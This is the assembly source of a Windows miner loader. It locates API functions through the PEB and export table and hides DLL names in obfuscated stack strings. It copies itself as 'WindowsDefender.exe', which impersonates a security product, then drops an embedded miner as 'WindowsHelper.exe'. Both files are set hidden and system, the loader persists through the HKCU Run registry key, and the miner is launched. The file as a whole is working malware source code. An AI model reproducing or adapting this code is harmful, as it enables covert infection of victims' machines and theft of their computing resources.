; MIT License
;
; Copyright (c) 2021 4B4DB4B3
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
; __         ______     ______     _____     ______     ______
;/\ \       /\  __ \   /\  __ \   /\  __-.  /\  ___\   /\  == \
;\ \ \____  \ \ \/\ \  \ \  __ \  \ \ \/\ \ \ \  __\   \ \  __<    4B4DB4B3
; \ \_____\  \ \_____\  \ \_\ \_\  \ \____-  \ \_____\  \ \_\ \_\
;  \/_____/   \/_____/   \/_/\/_/   \/____/   \/_____/   \/_/ /_/

format PE GUI 4.0
entry start
include 'MACRO/STRUCT.inc'

struct FUNC
        name rb 30
        addr dd ?
ends

section '.b4db4b3' data readable writeable
        GetProcAddress dd ?

        kernel32 dd ?
        kernelTable: 
                FUNC 'LoadLibraryA', 0
                FUNC 'GetModuleFileNameA', 0
                FUNC 'GetCurrentProcess', 0
                FUNC 'CopyFileA', 0
                FUNC 'CreateFileA', 0
                FUNC 'WriteFile', 0
                FUNC 'CloseHandle', 0
                FUNC 'SetFileAttributesA', 0
                FUNC 'ExitProcess', 0
        kernelTable.count = 9

        psapi dd ?
        psapiTable:
                FUNC 'GetModuleBaseNameA', 0
        psapiTable.count = 1

        shell32 dd ?
        shellTable:
                FUNC 'ShellExecuteA', 0
        shellTable.count = 1

        adv32 dd ?
        advTable:
                FUNC 'RegOpenKeyA', 0
                FUNC 'RegSetValueExA', 0
                FUNC 'RegCloseKey', 0
        advTable.count = 3

        oper db 'open', 0 ; runas = administrator
        filename db 'WindowsHelper.exe', 0
        filename_loader db 'WindowsDefender.exe', 0
        fn_loader_size = $ - filename_loader
        autorun db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
        keyname db 'WindowsDefender', 0

        ; USER ENTER
        param db 'argument for mining', 0

        hFile dd ?
        hKey dd ?

        mePath db 128 dup(0)
        mePath2 db 128 dup(0)

        miner file 'miner.bin'
        m_size = $ - miner

section '.b4db4b3' code readable executable
        start:  
                call init
;  ____________________________________________________________
; |                                                            |
; |                    KERNEL32 INIT                           |
; |____________________________________________________________|
                push kernelTable
                push kernelTable.count
                push [kernel32]
                call initFunctions

;  ____________________________________________________________
; |                                                            |
; |                    Load other libraries                    |
; |____________________________________________________________|
                push 0
                push 'l000'
                sub word[esp+0x1], '0'
                push 'i.dl'
                push 'psap'
                push esp
                call [kernelTable+FUNC.addr]
                test eax, eax
                jz exit

                mov [psapi], eax

                push 0
                push 'dll0'
                sub word[esp+0x3], '0'
                push 'l32.'
                push 'shel'
                push esp
                call [kernelTable+FUNC.addr]
                test eax, eax
                jz exit

                mov [shell32], eax

                push 0
                push '.dll'
                push 'pi32'
                push 'adva'
                push esp
                call [kernelTable+FUNC.addr]
                test eax, eax
                jz exit

                mov [adv32], eax
;  ____________________________________________________________
; |                                                            |
; |                    Other libaries init                     |
; |____________________________________________________________|
                push psapiTable
                push psapiTable.count
                push [psapi]
                call initFunctions

                push shellTable
                push shellTable.count
                push [shell32]
                call initFunctions

                push advTable
                push advTable.count
                push [adv32]
                call initFunctions
;  ____________________________________________________________
; |                                                            |
; |                    Main code start                         |
; |____________________________________________________________|

                push 128
                push mePath
                push 0
                call [kernelTable+1*sizeof.FUNC+FUNC.addr]

                call [kernelTable+2*sizeof.FUNC+FUNC.addr]

                push 128
                push mePath2
                push 0
                push eax
                call [psapiTable+FUNC.addr]

                xor ecx, ecx
        strcmp: inc ecx
                lea eax, [mePath2+ecx]
                lea ebx, [filename_loader+ecx]
                mov byte al, [eax]
                mov byte bl, [ebx]
                cmp ecx, fn_loader_size
                je succ_strcmp

                cmp al, bl
                jne err_strcmp
                jmp strcmp
        err_strcmp:
;  ____________________________________________________________
; |                                                            |
; |             Drop in another file and run                   |
; |____________________________________________________________|
                push filename_loader
                push mePath
                call [kernelTable+3*sizeof.FUNC+FUNC.addr]

                push 0
                push 0
                push 0
                push filename_loader
                push oper
                push 0
                call [shellTable+FUNC.addr]

                push 0
                call [kernelTable+4*sizeof.FUNC+FUNC.addr]
                ret

        succ_strcmp:
;  ____________________________________________________________
; |                                                            |
; |                Runned by dropped file                      |
; | Dropping miner, running him, registering yourself          |
; |                                                in autorun  |
; |____________________________________________________________|
                push 0
                push 0
                push 1
                push 0
                push 0x00000002
                push 0x40000000
                push filename
                call [kernelTable+4*sizeof.FUNC+FUNC.addr]
                cmp dword[fs:0x34], 0x0
                jne skipWrite

                mov [hFile], eax

                push 0
                push 0
                push m_size
                push miner
                push [hFile]
                call [kernelTable+5*sizeof.FUNC+FUNC.addr]

                push [hFile]
                call [kernelTable+6*sizeof.FUNC+FUNC.addr]

        skipWrite:
                push 4 or 2
                push filename
                call [kernelTable+7*sizeof.FUNC+FUNC.addr]

                push 4 or 2
                push mePath
                call [kernelTable+7*sizeof.FUNC+FUNC.addr]

                push hKey
                push autorun
                push 0x80000001
                call [advTable+FUNC.addr]

                xor ecx, ecx
        strlen: inc ecx
                lea eax, [mePath+ecx]
                mov byte al, [eax]
                cmp al, 0
                jne strlen

                push ecx 
                push mePath
                push 0x1
                push 0
                push keyname
                push [hKey]
                call [advTable+1*sizeof.FUNC+FUNC.addr]

                push [hKey]
                call [advTable+2*sizeof.FUNC+FUNC.addr]

                push 0
                push 0
                push param
                push filename
                push oper
                push 0
                call [shellTable+FUNC.addr]
        exit:
                push 0
                call [kernelTable+8*sizeof.FUNC+FUNC.addr]
                ret

        initFunctions:
                xor esi, esi
        startInit:
                cmp esi, [esp+8]
                je functionsEndInit

                mov ebx, [esp+12]
                mov edx, esi
                imul edx, sizeof.FUNC
                add ebx, edx

                mov eax, [esp+4]
                push ebx
                push eax
                call [GetProcAddress]

                mov [ebx+FUNC.addr], eax

                inc esi
                jmp startInit

        functionsEndInit:
                ret

        init:
                mov edi, [fs:0x030]
                mov edi, [edi + 0x00c]
                mov edi, [edi + 0x014]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x10]

                mov [kernel32], edi

                mov edx, [edi + 0x3c]
                add edx, edi
                mov edx, [edx + 0x78]
                add edx, edi
                mov esi, [edx + 0x20]
                add esi, edi
                xor ecx, ecx

        searchProcAddr:
                inc ecx
                lodsd
                add eax, edi
                cmp dword[eax], 'GetP'
                jnz searchProcAddr
                cmp dword[eax + 0x4], 'rocA'
                jnz searchProcAddr
                cmp dword[eax + 0x8], 'ddre'
                jnz searchProcAddr


                mov esi, [edx + 0x24]
                add esi, edi
                mov cx, [esi + ecx * 2]
                dec ecx
                mov esi, [edx + 0x1c]
                add esi, edi
                mov edx, [esi + ecx * 4]
                add edx, edi
                mov [GetProcAddress], edx

                ret